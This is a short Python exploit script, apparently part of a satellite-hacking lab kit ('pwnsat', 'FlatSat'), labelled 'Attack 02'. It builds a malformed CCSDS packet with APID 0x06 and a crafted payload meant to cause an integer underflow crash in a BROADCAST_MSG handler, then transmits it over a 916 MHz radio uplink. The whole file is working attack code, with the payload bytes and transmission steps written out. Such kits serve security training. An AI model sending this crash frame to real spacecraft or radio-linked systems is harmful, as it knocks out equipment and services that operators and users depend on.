#!/usr/bin/env python3
"""
Attack 02: BROADCAST_MSG Integer Underflow Crash (RF Variant via Radio 1 RF Uplink)
Transmits malformed CCSDS APID 0x06 frame over-the-air on 916 MHz.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from pwnsat_packets import build_ccsds_packet
from pwnsat_rf import FlatSatRF

def main():
    print("[+] Attack 02: BROADCAST_MSG Integer Underflow Crash (Over-The-Air RF 916 MHz Variant)")
    rf = FlatSatRF()
    packet = build_ccsds_packet(apid=0x06, payload=b"\xFF\x00\xFF\xFF")
    print("[*] Transmitting crash frame over 916.0 MHz uplink...")
    rf.transmit_rf(packet)
    print("[✓] RF Crash frame transmitted. NeoPixel LED set to Magenta.")

if __name__ == "__main__":
    main()
